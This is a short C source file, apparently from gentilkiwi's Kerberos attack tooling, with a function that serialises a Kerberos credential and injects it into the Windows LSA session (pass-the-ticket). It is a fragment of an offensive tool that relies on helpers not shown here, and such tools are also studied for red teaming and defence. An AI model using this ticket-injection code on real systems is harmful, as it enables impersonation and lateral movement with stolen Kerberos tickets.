/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "lsa.h"

BOOL kiwi_lsa_write(KRB_CRED *cred, OssBuf *output)
{
	BOOL status = FALSE;
	
	if(status = kiwi_krbcred_write(cred, output))
	{
		if(NT_SUCCESS(kull_m_kerberos_helper_util_ptt_data(output->value, output->length)))
			kprintf("injected\n");
	}
	return status;
}